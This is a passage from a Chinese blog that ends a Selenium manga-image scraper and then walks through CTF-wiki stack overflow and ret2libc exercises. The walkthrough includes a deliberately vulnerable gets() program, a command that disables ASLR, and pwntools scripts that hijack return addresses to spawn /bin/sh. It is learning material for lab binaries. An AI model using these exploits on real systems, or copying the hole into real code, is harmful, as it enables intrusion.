class="number">1</span>)</span><br><span class="line">            browser.get(NextPage)</span><br><span class="line">        </span><br><span class="line">        print(<span class="string">&#x27;当前章节\t&#123;&#125;  下载完毕&#x27;</span>.<span class="built_in">format</span>(browser.title))</span><br><span class="line">    browser.quit()</span><br><span class="line">    print(<span class="string">&#x27;所有章节下载完毕&#x27;</span>)</span><br></pre></td></tr></table></figure><p>剩下就是导入的库、全局变量和执行部分</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"></span><br><span class="line">Name=<span class="string">&#x27;化物语&#x27;</span></span><br><span class="line">indexurl=<span class="string">&#x27;http://manhua.kukudm.com/comiclist/2372/&#x27;</span></span><br><span class="line">options=webdriver.FirefoxOptions()           </span><br><span class="line">options.headless=<span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">Comics=get_TOF(indexurl)</span><br><span class="line">get_pic(Comics)</span><br></pre></td></tr></table></figure><p>可以正常运行，就是太慢……还可能会卡在某一页……继续改进</p><hr><p>修复了因频繁访问被强制断开连接的问题并换了一个好点的wifi后勉强能用了，完整代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">更新日志</span></span><br><span class="line"><span class="string">1.1 自动跳过空章节</span></span><br><span class="line"><span class="string">1.2 卡在一页时会自动刷新</span></span><br><span class="line"><span class="string">1.3 增加进度条功能</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Name=<span class="string">&#x27;化物语&#x27;</span></span><br><span class="line">indexurl=<span class="string">&#x27;http://manhua.kukudm.com/comiclist/2372/&#x27;</span></span><br><span class="line">options=webdriver.FirefoxOptions()           </span><br><span class="line">options.headless=<span class="literal">True</span></span><br><span class="line">start_chap=<span class="number">54</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">SavePic</span>(<span class="params">filename,url</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    保存单张图片的函数</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        content=requests.get(url).content</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(filename,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(content)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        SavePic(filename,url)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_TOF</span>(<span class="params">index_url</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    从主页面获取各章节url</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    </span><br><span class="line">    url_list=[]</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#模拟浏览器打开网站</span></span><br><span class="line">    browser=webdriver.Firefox(options=options)</span><br><span class="line">    browser.get(index_url)</span><br><span class="line">    browser.implicitly_wait(<span class="number">3</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#获取章节列表的元素</span></span><br><span class="line">    comics_list_id=browser.find_element_by_id(<span class="string">&quot;comiclistn&quot;</span>)</span><br><span class="line">    chapter_list=comics_list_id.find_elements_by_xpath(<span class="string">&quot;./*&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#生成章节列表</span></span><br><span class="line">    <span class="keyword">for</span> part <span class="keyword">in</span> chapter_list:</span><br><span class="line">        link=part.find_elements_by_tag_name(<span class="string">&#x27;a&#x27;</span>)[<span class="number">1</span>]</span><br><span class="line">        url_list.append(link.get_attribute(<span class="string">&#x27;href&#x27;</span>))</span><br><span class="line">    </span><br><span class="line">    browser.quit()</span><br><span class="line">    </span><br><span class="line">    Comics=<span class="built_in">dict</span>(name=Name,urls=url_list)</span><br><span class="line">    </span><br><span class="line">    print(<span class="string">&quot;目录信息爬取成功&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> Comics</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_pic</span>(<span class="params">browser,cururl,dirname,i,n</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    为防止卡在一个页面设置的递归函数</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        browser.get(cururl)</span><br><span class="line">        <span class="comment">#获取图片url</span></span><br><span class="line">        pic_url=browser.find_element_by_tag_name(<span class="string">&#x27;img&#x27;</span>).get_attribute(<span class="string">&#x27;src&#x27;</span>)</span><br><span class="line">        filename=dirname+<span class="string">&#x27;/&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27;.jpg&#x27;</span></span><br><span class="line">        <span class="comment">#保存图片到本地</span></span><br><span class="line">        SavePic(filename,pic_url)</span><br><span class="line">        <span class="comment">#获取下一页url</span></span><br><span class="line">        NextPage = browser.find_elements_by_tag_name(<span class="string">&#x27;a&#x27;</span>)[-<span class="number">1</span>].get_attribute(<span class="string">&#x27;href&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> NextPage</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> get_pic(browser,cururl,i)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_pics</span>(<span class="params">Comics</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    根据主页面获取的信息逐章爬取图片</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    comic_list=Comics[<span class="string">&#x27;urls&#x27;</span>]</span><br><span class="line">    basedir=Comics[<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#desired_capabilities = DesiredCapabilities.FIREFOX</span></span><br><span class="line">    </span><br><span class="line">    browser=webdriver.Firefox(options=options)</span><br><span class="line">    <span class="comment">#desired_capabilities[&quot;pageLoadStrategy&quot;] = &quot;normal&quot;</span></span><br><span class="line">    curchap=<span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> url <span class="keyword">in</span> comic_list:</span><br><span class="line">        curchap+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> curchap&lt;start_chap:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">#打开某一章节页面</span></span><br><span class="line">        browser.get(url)</span><br><span class="line">        browser.implicitly_wait(<span class="number">10</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment">#获取标题</span></span><br><span class="line">            title=browser.title</span><br><span class="line">            <span class="comment">#获取页数</span></span><br><span class="line">            temptext=browser.find_element_by_xpath(<span class="string">&quot;//*[contains(text(),&#x27;共&#x27;)]&quot;</span>).text</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">#在本地创建文件夹保存</span></span><br><span class="line">        dirname=basedir+<span class="string">&#x27;/&#x27;</span>+<span class="built_in">str</span>(title)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.isdir(dirname):</span><br><span class="line">            os.mkdir(dirname)</span><br><span class="line">        </span><br><span class="line">        pageNum=<span class="built_in">int</span>(re.findall(<span class="string">r&#x27;\d+&#x27;</span>,temptext)[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">        cururl=url</span><br><span class="line">        </span><br><span class="line">        pbar=tqdm(<span class="built_in">range</span>(pageNum))</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> pbar:</span><br><span class="line">            cururl=get_pic(browser,cururl,dirname,i+<span class="number">1</span>,<span class="number">0</span>)</span><br><span class="line">            pbar.set_description(<span class="string">&#x27;&#123;&#125;  &#x27;</span>.<span class="built_in">format</span>(title)+<span class="string">&#x27;共&#x27;</span>+<span class="built_in">str</span>(pageNum)+<span class="string">&#x27;页&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">    browser.quit()</span><br><span class="line">    print(<span class="string">&#x27;所有章节下载完毕&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">Comics=get_TOF(indexurl)</span><br><span class="line">get_pics(Comics)</span><br></pre></td></tr></table></figure><p>速度还是不够快，但selenium模拟浏览器操作也没法快到哪里去，以后可以考虑换个框架</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>pwn栈溢出的首次尝试和基本ROP</title>
      <link href="2020/11/19/pwn%E6%A0%88%E6%BA%A2%E5%87%BA%E7%9A%84%E9%A6%96%E6%AC%A1%E5%B0%9D%E8%AF%95/"/>
      <url>2020/11/19/pwn%E6%A0%88%E6%BA%A2%E5%87%BA%E7%9A%84%E9%A6%96%E6%AC%A1%E5%B0%9D%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<p><strong>模仿ctfwiki上实例进行首次pwn以及基本ROP的学习</strong></p><a id="more"></a><p>首先记录下手动复现实例的过程</p><h3 id="基础栈溢出"><a href="#基础栈溢出" class="headerlink" title="基础栈溢出"></a>基础栈溢出</h3><h4 id="构建c语言可执行文件"><a href="#构建c语言可执行文件" class="headerlink" title="构建c语言可执行文件"></a>构建c语言可执行文件</h4><p>代码如下,原文件保存为stack_example.c：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">success</span><span class="params">()</span> </span>&#123; <span class="built_in">puts</span>(<span class="string">&quot;You Hava already controlled it.&quot;</span>); &#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vulnerable</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">12</span>];</span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">  vulnerable();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>终端输入命令如下，其中m32指生成32位程序，-fno-stack-protector指不开启堆栈溢出保护，-no-pie指关闭PIE：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 -fno-stack-protector -no-pie stack_example.c -o stack_example</span><br></pre></td></tr></table></figure><p>可以用checksec工具检查编译后的文件,命令和结果如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">checksec stack_example</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>这里简要介绍下各项保护机制：</p><ul><li>NX：通过现代操作系统内存保护单元MPU机制对内存页的权限进行设置，具体表现为可写权限与可执行权限互斥，gcc默认开启NX保护，可在编译时加入“-z execstack”参数关闭</li><li>Stack Canary：针对栈溢出攻击的保护，因为栈溢出要通过溢出覆盖函数栈高位的返回地址，因此要在返回地址前写入一个字长的随机数据，在函数返回前校验该值是否被改变。gcc默认开启Stack Canary保护，可在编译时加入“-fno-stack-protector”参数关闭</li><li>ASLR：将程序堆栈地址和动态链接库的加载地址进行一定的随机化，是系统等级的保护机制，关闭方法是修改<code>/proc/sys/kernel/randomize_va_space</code>为0，可使用<code>echo 0 &gt; /proc/sys/kernel/randomize_va_space</code>关闭</li><li>PIE：类似于ASLR，将可执行程序ELF的地址进行随机化加载，可在编译时加入-no-pie”参数关闭</li></ul><h4 id="分析可执行文件结构"><a href="#分析可执行文件结构" class="headerlink" title="分析可执行文件结构"></a>分析可执行文件结构</h4><p>用IDA打开可执行文件进行分析，可以看到vulnerable函数反编译后如下图所示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vulnerable</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line"></span><br><span class="line">  gets(&amp;s);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(&amp;s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看出字符串s距离ebp的长度为0x14,vulnerable函数对应的栈结构为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">             +-----------------+   0x1C</span><br><span class="line">             |     retaddr     |</span><br><span class="line">             +-----------------+   0x18</span><br><span class="line">             |     saved ebp   |</span><br><span class="line">      ebp---&gt;+-----------------+   0x14</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">s,ebp-0x14--&gt;+-----------------+   0</span><br></pre></td></tr></table></figure><p>同时可以用IDA获取success地址，为0x0804843B</p><p>由于gets会读到回车才结束，就可以直接读取任意长度字符串，若我们输入的字符串为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x18*&#39;a&#39;+success_addr</span><br></pre></td></tr></table></figure><p>即可将success_addr覆盖retaddr内容，让程序执行success函数的内容。</p><p>这里需要使用pwntools，具体python2脚本代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh=process(<span class="string">&#x27;./stack_example&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sa=<span class="number">0x0804843B</span></span><br><span class="line">pre=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span></span><br><span class="line">in0=pre+p32(sa)</span><br><span class="line"></span><br><span class="line">sh.sendline(in0)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>python3中由于bytes和string做了区分不能直接使用以上代码，暂时也没啥好的解决方案，暂时搁置。</p><p>在python2环境中运行以上脚本就可以看到success函数执行对应的输出。</p><hr><h3 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h3><p>ROP，即返回地址导向编程，通常利用动态链接库和可执行文件中可利用的指令片段，这些片段均以ret指令结尾，被称为gadgets。ROP攻击需要满足两个条件：</p><ul><li>程序存在溢出，并可控制返回地址</li><li>找到满足条件的gadgets和对应的地址</li></ul><h4 id="示例一"><a href="#示例一" class="headerlink" title="示例一"></a>示例一</h4><p>文件来源：bamboofox的ret2libc1</p><p>首先检查文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ssr@ubuntu:~/pwn$ file ret2libc1</span><br><span class="line">ret2libc1: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, <span class="keyword">for</span> GNU/Linux 2.6.24, BuildID[sha1]=fb89c86b266de4ff294489da59959a62f7aa1e61, not stripped</span><br><span class="line">ssr@ubuntu:~/pwn$ checksec ret2libc1</span><br><span class="line">[*] <span class="string">&#x27;/home/ssr/pwn/ret2libc1&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>32位elf程序，开启了NX保护。</p><p>用IDA打开f5查看主函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">100</span>]; <span class="comment">// [esp+1Ch] [ebp-64h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;RET2LIBC &gt;_&lt;&quot;</span>);</span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用了gets函数存在栈溢出。</p><p>首先确定可以控制的内存的起始地址距离main函数返回地址的字节数，需要开始调试，将断点下在<code>0x0804867E</code>即<code>call _gets</code>处，查看寄存器情况</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">ssr@ubuntu:~/pwn$ gdb ./ret2libc1</span><br><span class="line">pwndbg: loaded 190 commands. Type pwndbg [filter] <span class="keyword">for</span> a list.</span><br><span class="line">pwndbg: created <span class="variable">$rebase</span>, <span class="variable">$ida</span> gdb <span class="built_in">functions</span> (can be used with <span class="built_in">print</span>/<span class="built_in">break</span>)</span><br><span class="line">Reading symbols from ./ret2libc1...done.</span><br><span class="line">gdb-peda$ b *0x0804867E</span><br><span class="line">Breakpoint 1 at 0x804867e: file ret2libc1.c, line 27.</span><br><span class="line">gdb-peda$ r</span><br><span class="line">Starting program: /home/ssr/pwn/ret2libc1 </span><br><span class="line">RET2LIBC &gt;_&lt;</span><br><span class="line"></span><br><span class="line">省略部分内容</span><br><span class="line"></span><br><span class="line">─────────────────────────────────[ REGISTERS ]──────────────────────────────────</span><br><span class="line"> EAX  0xffffcf1c —▸ 0x8048312 ◂— pop    edi /* <span class="string">&#x27;__libc_start_main&#x27;</span> */</span><br><span class="line"> EBX  0x0</span><br><span class="line"> ECX  0xffffffff</span><br><span class="line"> EDX  0xf7fb4870 (_IO_stdfile_1_lock) ◂— 0x0</span><br><span class="line"> EDI  0xf7fb3000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0</span><br><span class="line"> ESI  0xf7fb3000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0</span><br><span class="line"> EBP  0xffffcf88 ◂— 0x0</span><br><span class="line"> ESP  0xffffcf00 —▸ 0xffffcf1c —▸ 0x8048312 ◂— pop    edi /* <span class="string">&#x27;__libc_start_main&#x27;</span> */</span><br><span class="line"> EIP  0x804867e (main+102) —▸ 0xfffdade8 ◂— 0xfffdade8</span><br><span class="line">───────────────────────────────────[ DISASM ]───────────────────────────────────</span><br></pre></td></tr></table></figure><p>可以看到 esp 为 0xffffcf00 ，ebp 为 0xffffcf88，s的地址为 0xffffcf1c，所以s相对于 ebp 的偏移为0x6c，所以相对与返回地址的偏移为0x6c+4</p><p>在IDA中使用字符查找发现<code>/bin/sh</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.rodata:08048720 aBinSh          db &#39;&#x2F;bin&#x2F;sh&#39;,0          ; DATA XREF: .data:shell↓o</span><br></pre></td></tr></table></figure><p>且找到函数<code>system</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.plt:08048460 ; int system(const char *command)</span><br></pre></td></tr></table></figure><p>则可以直接返回该处执行system函数。脚本如下所示</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io=process(<span class="string">&#x27;./ret2libc1&#x27;</span>)</span><br><span class="line">system_plt = <span class="number">0x08048460</span></span><br><span class="line">binsh_adr= <span class="number">0x08048720</span></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x6c</span>+<span class="number">4</span>)+p32(system_plt)+<span class="string">&#x27;a&#x27;</span>*<span class="number">4</span>+p32(binsh_adr)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h4 id="示例二"><a href="#示例二" class="headerlink" title="示例二"></a>示例二</h4><p>文件来源：bamboofox的ret2libc2</p><p>栈溢出漏洞情况与示例一基本一致，偏移量同样是0x6c+4</p><p>可以找到函数system</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.plt:08048490 ; int system(const char *command)</span><br></pre></td></tr></table></figure><p>但不存在字符串<code>/bin/sh</code>，所以需要手动读取字符串，所以需要两个gadgets，第一个控制程序读取字符串，第二个控制程序执行shellcode，然后在可写的bss段找到一个变量buf2用于存放两个控制程序的参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.bss:0804A080 ; char buf2[100]</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io=process(<span class="string">&#x27;./ret2libc2&#x27;</span>)</span><br><span class="line">system_plt = <span class="number">0x08048490</span></span><br><span class="line">gets_plt = <span class="number">0x08048460</span></span><br><span class="line">buf2_adr= <span class="number">0x0804A080</span></span><br><span class="line"></span><br><span class="line">payload =<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x6c</span>+<span class="number">4</span>)+p32(gets_plt)</span><br><span class="line">payload+=p32(system_plt)+p32(buf2_adr)+p32(buf2_adr)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>此时栈溢出的分布为</p><ul><li>gets地址，覆盖了main函数的返回地址</li><li>system地址，同样是gets的返回地址</li><li>buf2地址，是gets的参数，同样是system的伪返回地址</li><li>buf2地址，是system的参数</li></ul><h4 id="示例三"><a href="#示例三" class="headerlink" title="示例三"></a>示例三</h4><p>文件来源：bamboofox的ret2libc3</p><p>下面来看一个稍微复杂攻击实例</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 